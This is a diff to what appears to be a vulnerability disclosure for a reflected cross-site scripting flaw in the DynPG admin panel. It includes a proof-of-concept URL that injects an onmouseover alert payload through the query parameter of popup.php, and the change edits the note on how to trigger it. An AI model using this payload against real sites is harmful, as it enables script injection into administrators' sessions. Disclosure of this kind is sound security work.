@@ -11,7 +11,9 @@ Steps to Reproduce the Issue:
 1- Login to DynPG admin panel
 2- Paste below POC:
 https://localhost/dynpg/backendpopup/popup.php?limit=&orderby=&page=&popUpResource=texts&query=x"%20onmouseover=alert(4)%20x="&refID=&returnCall=&sort=&valueID=
-As you can see, XSS is triggered.
+
+(hover your mouse to “x” to trigger XSS)
+
 
 Video POC: 
 ___
